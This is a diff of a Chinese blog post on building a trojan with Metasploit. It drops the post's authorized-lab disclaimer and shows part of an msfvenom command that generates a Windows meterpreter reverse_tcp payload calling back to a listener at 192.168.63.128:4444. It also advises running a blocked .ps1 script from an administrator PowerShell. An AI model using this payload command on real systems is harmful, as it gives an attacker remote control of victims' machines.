@@ -1,10 +1,12 @@
 ---
-title: MSF 构建木马与远程控制（渗透测试实验）
-date: 2026-07-08
-tags: [Metasploit, 渗透测试, Meterpreter]
+title: msf构建木马
+date: 2026-07-15
+tags: []
 ---
 
-> **声明**：本文仅用于授权渗透测试实验环境，所有操作均在自建靶机上进行，请勿用于非法用途。
+# msf构建木马
+
+
 
 #### 1、生成木马
 
@@ -16,7 +18,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.63.128 LPORT=4444 
 
 .ps1脚本文件不一定能执行成功
 
-比如提示"在此系统中禁止执行脚本"
+比如提示“在此系统中禁止执行脚本“
 
 需要以管理员身份打开powershell执行
 
